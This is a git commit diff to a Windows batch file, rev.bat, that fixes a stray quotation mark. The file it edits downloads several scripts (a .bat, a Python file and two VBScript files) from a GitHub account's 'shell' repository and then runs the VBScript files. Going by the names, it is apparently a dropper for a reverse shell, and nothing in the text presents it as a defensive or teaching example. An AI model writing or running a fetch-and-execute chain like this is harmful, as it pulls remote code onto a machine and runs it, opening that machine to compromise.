272ecf98191d1cd94e2f49c69fc43b1a60e8ca2f
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 14:36:25 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -4,6 +4,6 @@ curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o D:\sh.py
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
-start /wait D:\vb.vbs"
+start /wait D:\vb.vbs
 call "%downloads_dir%\vb1.vbs"
 
